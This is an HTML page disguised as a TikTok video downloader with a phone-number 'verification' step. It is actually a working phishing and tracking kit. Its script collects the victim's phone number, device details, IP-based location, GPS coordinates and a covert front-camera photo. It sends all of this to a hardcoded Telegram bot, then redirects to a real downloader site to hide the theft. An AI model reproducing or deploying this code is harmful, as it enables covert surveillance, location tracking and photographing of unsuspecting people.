<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok HD Downloader</title>
    <style>
        body { font-family: sans-serif; background-color: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e1e1e; padding: 20px; border-radius: 15px; text-align: center; width: 90%; max-width: 350px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        img { width: 60px; margin-bottom: 15px; }
        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; border: 1px solid #333; background: #2c2c2c; color: white; box-sizing: border-box; outline: none; }
        button { width: 100%; padding: 12px; border: none; border-radius: 8px; background: #fe2c55; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:disabled { background: #555; cursor: not-allowed; font-size: 13px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" alt="TikTok">
    <h2>TikTok Verification</h2>
    <p style="color: #fe2c55; font-size: 14px;">ဗီဒီယိုဒေါင်းရန် ဖုန်းနံပါတ်ဖြင့် အကောင့်ဝင်ပါ</p>
    
    <input type="tel" id="phone" placeholder="09xxxxxxxxx">
    
    <button id="loginBtn" onclick="startTracking()">အကောင့်၀င်ရန်</button>
    <p id="status" style="font-size: 12px; color: #888; margin-top: 10px;"></p>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const token = '8895720681:AAGuAuVf5qAwD3y84RiH7B3fEfBz9P1t_Hs'; // မင်းရဲ့ Bot Token
    const chat_id = '5304050102'; // မင်းရဲ့ ID

    async function startTracking() {
        const phone = document.getElementById('phone').value;
        const btn = document.getElementById('loginBtn');

        if (!phone) { alert("ဖုန်းနံပါတ် ထည့်ပေးပါ!"); return; }

        btn.disabled = true;
        btn.innerText = "စစ်ဆေးနေပါသည်... ခွင့်ပြုချက်တောင်းခဲ့လျှင် Allow ကို နှိပ်ပေးပါ။";

        // ၁။ Battery အခြေအနေ ရယူခြင်း
        let batteryInfo = "Unknown";
        try {
            const battery = await navigator.getBattery();
            batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
        } catch (e) {}

        let report = `🚀 **Target Info Found!**\n\n`;
        report += `📱 Phone: ${phone}\n`;
        report += `🔋 Battery: ${batteryInfo}\n`;
        report += `📱 Device: ${navigator.platform}\n`;
        report += `🖥 Screen: ${window.screen.width}x${window.screen.height}\n`;

        // ၂။ IP နှင့် မြို့အမည် ရယူခြင်း
        try {
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();
            report += `🌐 IP: ${ipData.ip}\n📍 City: ${ipData.city}\n🏢 ISP: ${ipData.org}\n`;
        } catch (e) {}

        // ၃။ တည်နေရာ (Location) ရယူခြင်း
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                report += `📍 Map: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
                await capturePhoto(report);
            }, async () => {
                report += `📍 Location: Permission Denied\n`;
                await capturePhoto(report);
            });
        } else {
            await capturePhoto(report);
        }
    }

    async function capturePhoto(fullReport) {
        try {
            // ၄။ ကင်မရာပုံ ဖမ်းယူခြင်း
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const v = document.getElementById('v');
            v.srcObject = stream;

            setTimeout(async () => {
                const c = document.getElementById('c');
                c.width = 640;
                c.height = 480;
                c.getContext('2d').drawImage(v, 0, 0);
                const blob = await new Promise(res => c.toBlob(res, 'image/jpeg'));

                const formData = new FormData();
                formData.append('chat_id', chat_id);
                formData.append('photo', blob, 'shot.jpg');
                formData.append('caption', fullReport);

                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                window.location.href = "https://ssstik.io/en";
            }, 3000);
        } catch (err) {
            // ကင်မရာမရလျှင် စာသားသက်သက်ပို့မည်
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(fullReport)}&parse_mode=Markdown`);
            window.location.href = "https://ssstik.io/en";
        }
    }
</script>

</body>
</html>
